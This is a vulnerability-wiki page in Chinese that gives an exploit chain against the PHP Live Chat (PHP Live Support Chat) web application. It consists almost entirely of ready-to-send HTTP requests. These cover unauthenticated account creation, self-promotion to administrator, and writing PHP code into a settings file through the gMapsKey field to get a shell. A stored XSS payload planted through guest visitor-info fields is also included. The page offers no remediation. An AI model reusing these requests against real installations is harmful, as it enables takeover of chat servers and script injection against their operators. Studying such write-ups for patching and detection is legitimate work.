<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/PHP%20Live%20Chat/PHP-Live-Chat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E7%BB%84%E5%90%88%E6%8B%B3GetShell/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>PHP Live Chat代码审计之组合拳GetShell - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "PHP-Live-Chat\u4ee3\u7801\u5ba1\u8ba1\u4e4b\u7ec4\u5408\u62f3GetShell", url: "#_top", children: [
          ]},
          {title: "1.\u672a\u6388\u6743\u521b\u5efa\u8d26\u53f7", url: "#1", children: [
          ]},
          {title: "2.\u6dfb\u52a0\u81ea\u8eab\u7ba1\u7406\u5458\u6743\u9650", url: "#2", children: [
          ]},
          {title: "3.\u4fee\u6539gMapsKey\u5b9e\u73b0GetShell", url: "#3gmapskeygetshell", children: [
          ]},
          {title: "XSS", url: "#xss", children: [
              {title: "1.\u8bbf\u5ba2\u4fe1\u606f\u4e0a\u4f20XSS", url: "#1xss" },
          ]},
          {title: "\u6f0f\u6d1e\u6765\u6e90", url: "#_1", children: [
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../PHP-Live-Chat/PHP-Live-Chat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E7%BB%84%E5%90%88%E6%8B%B3GetShell/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../PHP-Live-Chat/PHP-Live-Chat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E7%BB%84%E5%90%88%E6%8B%B3GetShell/" class="btn btn-xs btn-link">
        PHP Live Chat代码审计之组合拳GetShell
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../PEPM%E7%B3%BB%E7%BB%9F/PEPM%E7%B3%BB%E7%BB%9FCookie%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%28XVE-2024-16919%29/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../PEPM%E7%B3%BB%E7%BB%9F/PEPM%E7%B3%BB%E7%BB%9FCookie%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%28XVE-2024-16919%29/" class="btn btn-xs btn-link">
        PEPM系统Cookie存在远程代码执行漏洞(XVE-2024-16919)
      </a>
    </div>
    
  </div>

    

    <h2 id="php-live-chatgetshell">PHP-Live-Chat代码审计之组合拳GetShell<a class="headerlink" href="#php-live-chatgetshell" title="Permanent link">&para;</a></h2>
<p>PHP Live Chat 全名为 PHP Live Support Chat，官方网站<a href="https://www.t00ls.com/link.html?url=https%3A%2F%2Flivechat.mirrormx.net%2F">https://livechat.mirrormx.net/</a>，目前有三个版本lite、普通和pro。</p>
<h2 id="1">1.未授权创建账号<a class="headerlink" href="#1" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code>POST /php/app.php?mobile-operator-create HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 61

roles=OPERATOR&amp;name=mrfool&amp;mail=mrfool%40x.xx&amp;password=111111
</code></pre></div>
<p>创建成功并返回账号id</p>
<p><img alt="image-20240529155148187" src="https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202405291551257.png" /></p>
<h2 id="2">2.添加自身管理员权限<a class="headerlink" href="#2" title="Permanent link">&para;</a></h2>
<blockquote>
<p>登录创建的账号后，修改当前ID权限为ADMIN和OPERATOR</p>
</blockquote>
<div class="highlight"><pre><span></span><code>POST /php/app.php?mobile-operator-update HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie:PHPSESSID=ikglrk04j3d85ivhrdhme8pv7p;
Connection: close
Content-Length: 26

id=28&amp;roles=ADMIN,OPERATOR
</code></pre></div>
<p><img alt="image-20240529155312721" src="https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202405291553784.png" /></p>
<h2 id="3gmapskeygetshell">3.修改gMapsKey实现GetShell<a class="headerlink" href="#3gmapskeygetshell" title="Permanent link">&para;</a></h2>
<blockquote>
<p>使用ADMIN权限的账号（权限修改后需重新登录获取PHPSESSID）修改gMapsKey从而实现GetShell</p>
</blockquote>
<div class="highlight"><pre><span></span><code><span class="nf">POST</span> <span class="nn">/php/app.php?config-update-settings</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">localhost</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded; charset=UTF-8</span>
<span class="na">Cookie</span><span class="o">:</span><span class="l">PHPSESSID=s5vj6oib3agt4h9q7phd8akjlp;</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">23</span>

<span class="nt">gMapsKey</span><span class="o">=</span><span class="s">&lt;?phpinfo();?&gt;</span>
</code></pre></div>
<p>shell路径为/php/config/app.settings.php</p>
<p><img alt="image-20240529155339378" src="https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202405291553428.png" /></p>
<h2 id="xss">XSS<a class="headerlink" href="#xss" title="Permanent link">&para;</a></h2>
<h3 id="1xss">1.访客信息上传XSS<a class="headerlink" href="#1xss" title="Permanent link">&para;</a></h3>
<blockquote>
<p>发送消息时会同步上传访客信息，多个字段可触发，包括但不限于ip、referer、os。</p>
</blockquote>
<div class="highlight"><pre><span></span><code><span class="nf">POST</span> <span class="nn">/php/app.php?guest-manage-connection</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">localhost</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded; charset=UTF-8</span>
<span class="na">Cookie</span><span class="o">:</span> <span class="l">PHPSESSID=nbg5as8lo9scs8ujf6i0d7tr6a; </span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">537</span>

<span class="nt">lastMessageId</span><span class="o">=</span><span class="s">0</span><span class="p">&amp;</span><span class="nt">info</span><span class="o">=</span><span class="s">%7B%22ip%22%3A%22127.0.0.2%3Cimg%20src%3Dx%20onerror%3Dalert(%2Fxss%2F)%3E%22%2C%22referer%22%3A%22%22%2C%22userAgent%22%3A%22%22%2C%22browserName%22%3A%22%22%2C%22browserVersion%22%3A%22%22%2C%22os%22%3A%22%22%2C%22engine%22%3A%22%22%2C%22language%22%3A%22%22%2C%22geoloc%22%3A%7B%22countryCode%22%3A%22US%22%2C%22countryName%22%3A%22United%20States%22%2C%22city%22%3Anull%2C%22zipCode%22%3Anull%2C%22timeZone%22%3Anull%2C%22latitude%22%3A0%2C%22longitude%22%3A0%2C%22metroCode%22%3Anull%2C%22utcOffset%22%3A0%7D%7D</span>
</code></pre></div>
<p>外部访客列表未解析</p>
<p><img alt="image-20240529155403787" src="https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202405291554834.png" /></p>
<p>进入聊天页面触发</p>
<p><img alt="image-20240529155418672" src="https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202405291554735.png" /></p>
<h2 id="_1">漏洞来源<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<ul>
<li><a href="https://www.t00ls.com/articles-71766.html">https://www.t00ls.com/articles-71766.html</a></li>
</ul>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../PHP-Live-Chat/PHP-Live-Chat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E7%BB%84%E5%90%88%E6%8B%B3GetShell/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../PHP-Live-Chat/PHP-Live-Chat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E7%BB%84%E5%90%88%E6%8B%B3GetShell/" class="btn btn-xs btn-link">
        PHP Live Chat代码审计之组合拳GetShell
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../PEPM%E7%B3%BB%E7%BB%9F/PEPM%E7%B3%BB%E7%BB%9FCookie%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%28XVE-2024-16919%29/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../PEPM%E7%B3%BB%E7%BB%9F/PEPM%E7%B3%BB%E7%BB%9FCookie%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%28XVE-2024-16919%29/" class="btn btn-xs btn-link">
        PEPM系统Cookie存在远程代码执行漏洞(XVE-2024-16919)
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>